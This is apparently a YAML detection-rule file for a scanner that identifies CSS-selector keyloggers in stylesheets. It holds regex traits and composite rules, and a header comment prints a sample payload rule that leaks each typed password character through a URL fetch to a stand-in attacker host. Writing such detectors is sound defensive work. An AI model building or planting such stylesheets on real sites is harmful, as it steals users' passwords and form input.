# The stylesheet half of the CSS-selector keylogger. javascript.yaml covers the
# collection server and the demo page; this covers the delivered `.css` itself,
# which a stored XSS or a trojanized theme asset can carry on its own. The
# attack emits one rule per candidate character —
#   input[type=password][value$="a"] { background: url(https://c2/a) }
# — so whichever rule matches fetches an attacker URL that names the character
# typed. Styling a field by value happens on meaningful prefixes ("http",
# ".png"); keying rules on a *single* character, repeatedly, is the sweep.
defaults:
  platforms: [unix, windows]
  for: [html, text]
  attack: T1056.001

traits:
  - id: single-char-value-selector-sweep
    desc: Stylesheet enumerates one-character input values
    crit: suspicious
    conf: 0.95
    # A real sweep covers an alphabet; 8 keeps digits-only variants in range
    # while staying far above any hand-written stylesheet.
    count_min: 8
    if:
      type: text
      regex: '\[\s*value\s*[\^$*]=\s*["''].["'']'

  - id: css-adjacent-option-checked-sweep
    desc: CSS enumerates adjacent checked options
    crit: suspicious
    conf: 0.97
    count_min: 4
    if:
      type: text
      regex: '(?i)option\s*\+\s*option[^{]{0,100}:\s*checked[^{]{0,40}\{'

  - id: css-has-option-checked-sweep
    desc: CSS enumerates checked options with has
    crit: suspicious
    conf: 0.97
    count_min: 4
    if:
      type: text
      regex: '(?i):has\(\s*option\b[^)]{0,80}:\s*checked[^{]{0,40}\{'

  - id: css-select-password-mask
    desc: CSS masks select as password
    crit: suspicious
    conf: 0.96
    if:
      type: text
      regex: '(?is)\bselect\s*\{[^}]{0,700}\b(-webkit-)?text-security\s*:\s*(disc|circle|square)\b'

  - id: css-select-low-opacity
    desc: CSS lowers select opacity
    crit: suspicious
    conf: 0.92
    if:
      type: text
      regex: '(?i)\bselect\s*\{[^}]{0,600}\bopacity\s*:\s*(0|0?\.\d+)'

composite_rules:
  - id: css-checked-option-state-sweep
    desc: CSS enumerates checked select options
    crit: suspicious
    conf: 0.97
    any:
      - id: css-adjacent-option-checked-sweep
      - id: css-has-option-checked-sweep

  - id: css-obscured-select-control
    desc: CSS obscures a select control
    crit: suspicious
    conf: 0.94
    all:
      - id: micro-behaviors/ui/window/form-input::select-appearance-none-style
      - id: css-select-low-opacity
    near_bytes: 1800

  - id: css-value-selector-url-exfil
    desc: CSS keylogger leaks input via URL fetches
    crit: hostile
    conf: 0.96
    all:
      - id: single-char-value-selector-sweep
      - id: micro-behaviors/communications/http/client/resource::stylesheet-remote-url-value

  - id: css-checked-option-url-keylogger
    desc: Checked options send selected characters
    crit: hostile
    conf: 0.98
    attack: T1056.001,T1041
    all:
      - id: css-checked-option-state-sweep
    any:
      - id: micro-behaviors/communications/http/client/resource::stylesheet-remote-url-value
      - id: micro-behaviors/communications/http/client/resource::stylesheet-image-set-external-fallback
    near_bytes: 12000

  - id: css-masked-select-keylogger
    desc: Masked select keylogger
    crit: hostile
    conf: 0.98
    all:
      - id: css-checked-option-state-sweep
      - id: css-select-password-mask
      - id: css-obscured-select-control
    near_bytes: 12000
